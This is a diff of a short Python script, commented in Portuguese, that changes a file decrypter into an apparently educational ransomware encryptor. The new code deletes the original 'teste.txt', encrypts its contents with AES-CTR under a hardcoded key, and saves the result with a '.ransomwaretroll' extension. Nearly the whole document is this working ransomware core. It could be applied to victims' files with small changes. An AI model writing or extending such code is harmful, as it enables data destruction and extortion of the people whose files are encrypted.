@@ -1,33 +1,36 @@
 import os
 import pyaes
 
-def decrypt_file(encrypted_file_name, key):
+def encrypt_file(file_name, key):
     try:
-        # 1. Abrir o arquivo criptografado
-        with open(encrypted_file_name, "rb") as file:
+        # 1. Abrir o arquivo original em modo leitura binária
+        with open(file_name, "rb") as file:
             file_data = file.read()
 
-        # 2. Configurar a descriptografia com a MESMA chave
+        # 2. Remover o arquivo original para simular o "sequestro"
+        os.remove(file_name)
+
+        # 3. Configurar a criptografia AES (Advanced Encryption Standard)
+        # O modo CTR (Counter) é rápido e seguro para este propósito educacional
         aes = pyaes.AESModeOfOperationCTR(key)
-        decrypt_data = aes.decrypt(file_data)
 
-        # 3. Remover o arquivo criptografado
-        os.remove(encrypted_file_name)
+        # 4. Criptografar os dados
+        crypto_data = aes.encrypt(file_data)
 
-        # 4. Restaurar o arquivo original
-        original_file_name = "teste.txt"
-        with open(original_file_name, "wb") as new_file:
-            new_file.write(decrypt_data)
+        # 5. Salvar o arquivo criptografado com extensão personalizada
+        new_file_name = file_name + ".ransomwaretroll"
+        with open(new_file_name, "wb") as new_file:
+            new_file.write(crypto_data)
 
-        print(f"[SUCESSO] Arquivo restaurado para '{original_file_name}'.")
-
+        print(f"[SUCESSO] Arquivo '{file_name}' criptografado para '{new_file_name}'.")
+    
     except FileNotFoundError:
-        print(f"[ERRO] Arquivo criptografado '{encrypted_file_name}' não encontrado.")
+        print(f"[ERRO] O arquivo '{file_name}' não foi encontrado.")
     except Exception as e:
-        print(f"[ERRO] Falha na descriptografia: {e}")
+        print(f"[ERRO] Falha na criptografia: {e}")
 
-# A chave deve ser EXATAMENTE a mesma usada no encrypter
-key = b"testeransomwares"
-encrypted_file = "teste.txt.ransomwaretroll"
+# Definição da chave (DEVE ter 16, 24 ou 32 bytes)
+key = b"testeransomwares" # Chave de 16 bytes
+target_file = "teste.txt"
 
-decrypt_file(encrypted_file, key)
+encrypt_file(target_file, key)
